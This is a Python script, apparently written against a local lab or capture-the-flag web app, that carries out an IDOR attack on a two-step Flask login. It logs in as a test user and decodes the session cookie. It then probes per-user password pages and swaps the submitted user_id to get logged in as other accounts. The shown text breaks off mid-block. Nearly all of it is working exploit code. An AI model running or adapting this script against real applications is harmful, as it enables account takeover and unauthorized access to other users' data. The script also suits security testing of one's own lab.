import requests
import re
import base64
import json
import sys
import time

def print_section(title):
    print(f"\n{'='*60}")
    print(f" {title}")
    print(f"{'='*60}")

def safe_request(method, url, **kwargs):
    """Make request with retry logic and error handling"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = method(url, timeout=15, **kwargs)
            return response, None
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"[!] Request failed (attempt {attempt+1}/{max_retries}): {str(e)[:100]}...")
                time.sleep(1 * (attempt + 1))
            else:
                return None, str(e)
    return None, "All retries exhausted"

# Create session with browser-like headers
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
})

# Step 1: Initial Login Page
print_section("STEP 1: INITIAL LOGIN PAGE")
resp1, err1 = safe_request(session.get, 'http://127.0.0.1:32783/')
if err1:
    print(f"[-] Failed to load login page: {err1}")
    sys.exit(1)

print(f"[+] GET http://127.0.0.1:32783/")
print(f"[+] Status: {resp1.status_code}")
print(f"[+] Cookies: {dict(session.cookies)}")

# Look for CSRF tokens
csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', resp1.text)
hidden_fields = re.findall(r'<input[^>]*type="hidden"[^>]*>[^<]*name="[^"]*"[^>]*>', resp1.text)
print(f"[+] CSRF Token: {csrf_match.group(1) if csrf_match else 'NOT FOUND'}")
print(f"[+] Hidden fields: {len(hidden_fields)} found")

# Step 2: Username Submission
print_section("STEP 2: USERNAME SUBMISSION")
login_data = {'username': 'test'}
resp2, err2 = safe_request(session.post, 'http://127.0.0.1:32783/', data=login_data)
if err2:
    print(f"[-] Username submission failed: {err2}")
    sys.exit(1)

print(f"[+] POST username='test'")
print(f"[+] Status: {resp2.status_code}")
print(f"[+] Redirect History: {[r.status_code for r in resp2.history]}")
print(f"[+] Final URL: {resp2.url}")
print(f"[+] Cookies: {dict(session.cookies)}")

# Extract user_id
user_id_match = re.search(r'name="user_id" value="([^"]+)"', resp2.text)
username_match = re.search(r'name="username" value="([^"]+)"', resp2.text)
user_id = user_id_match.group(1) if user_id_match else None
username = username_match.group(1) if username_match else 'test'

print(f"[+] Extracted user_id: {user_id}")
print(f"[+] Extracted username: {username}")

# Step 3: Password Submission
print_section("STEP 3: PASSWORD SUBMISSION")
if not user_id:
    print("[-] No user_id extracted, skipping")
    sys.exit(1)

password_data = {'password': 'test', 'username': username, 'user_id': user_id}
resp3, err3 = safe_request(session.post, resp2.url, data=password_data)
if err3:
    print(f"[-] Password submission failed: {err3}")
    sys.exit(1)

print(f"[+] POST password with user_id={user_id}")
print(f"[+] Status: {resp3.status_code}")
print(f"[+] Redirect History: {[r.status_code for r in resp3.history]}")
print(f"[+] Final URL: {resp3.url}")
print(f"[+] Final Cookies: {dict(session.cookies)}")

# Step 4: Session Cookie Analysis
print_section("STEP 4: SESSION COOKIE ANALYSIS")
if 'session' not in session.cookies:
    print("[-] No session cookie found")
    sys.exit(1)

session_cookie = session.cookies['session']
print(f"[+] Session cookie: {session_cookie}")

if '.' in session_cookie:
    print("[+] Cookie matches Flask itsdangerous format")
    
    payload_part, sig_part = session_cookie.split('.', 1)
    print(f"[+] Payload part: {payload_part}")
    print(f"[+] Signature part: {sig_part}")
    
    # Decode payload
    padding_needed = len(payload_part) % 4
    if padding_needed:
        payload_part += '=' * (4 - padding_needed)
    
    try:
        decoded = base64.urlsafe_b64decode(payload_part)
        payload_str = decoded.decode('utf-8')
        session_data = json.loads(payload_str)
        
        print("[+] Decoded session data:")
        print(json.dumps(session_data, indent=2))
        
    except Exception as e:
        print(f"[-] Decode failed: {e}")
else:
    print("[-] Not in Flask format")

# Step 5: IDOR Testing
print_section("STEP 5: IDOR TESTING")

# Test 5.1: Direct /password/{username} access
print("\n[--- Test 5.1: Direct /password/{username} endpoints ---]")
test_users = ['admin', 'test2', 'root', 'user']
for test_user in test_users:
    test_session = requests.Session()
    test_session.headers.update({'User-Agent': 'Mozilla/5.0'})
    test_session.get('http://127.0.0.1:32783/')  # Get initial cookies
    
    test_resp, err = safe_request(test_session.get, f'http://127.0.0.1:32783/password/{test_user}')
    if err:
        print(f"[-] /password/{test_user}: {err}")
        continue
    
    print(f"\n[+] GET /password/{test_user}")
    print(f"[+] Status: {test_resp.status_code}")
    print(f"[+] Length: {len(test_resp.content)} bytes")
    
    user_id_test = re.search(r'name="user_id" value="([^"]+)"', test_resp.text)
    if user_id_test:
        print(f"[+] user_id: {user_id_test.group(1)}")

# Test 5.2: Tamper user_id in password submission
print("\n[--- Test 5.2: Tamper user_id in password submission ---]")
if user_id:
    tampered_ids = [10031, 10033, 1, 9999, 0, 10032]
    
    for tampered_id in tampered_ids:
        # Fresh session for each test
        test_session = requests.Session()
        test_session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        # Authenticate 
        test_session.get('http://127.0.0.1:32783/')
        login_resp, err = safe_request(test_session.post, 'http://127.0.0.1:32783/', data={'username': 'test'})
        if err:
            continue
        
        # Submit with tampered user_id
        tampered_data = {'password': 'test', 'username': 'test', 'user_id': str(tampered_id)}
        tamper_resp, err = safe_request(test_session.post, login_resp.url, data=tampered_data)
        
        print(f"\n[+] Test user_id={tampered_id}")
        print(f"[+] Status: {tamper_resp.status_code if tamper_resp else 'FAILED'}")
        
        if tamper_resp and 'session' in test_session.cookies:
            sess_cookie = test_session.cookies['session']
            print(f"[+] Cookie received: {sess_cookie[:50]}...")
            
            # Decode if possible
            if '.' in sess_cookie:
                try:
                    payload = sess_cookie.split('.')[0]
                    padding = len(payload) % 4
                    if padding:
                        payload += '=' * (4 - padding)
                    
                    decoded = base64.urlsafe_b64decode(payload)
                    session_data = json.loads(decoded.decode('utf-8'))
                    
                    if 'user_id' in session_data:
                        actual_id = session_data['user_id']
                        print(f"[+] Session user_id: {actual_id}")
                        
                        if str(actual_id) == str(tampered_id):
                            print(f"[✓ TAMPERED SUCCESS - logged in as user_id={actual_id}")
                        else:
                            print(f"[-] Tamper failed - still user_id={actual_id}")
                except:
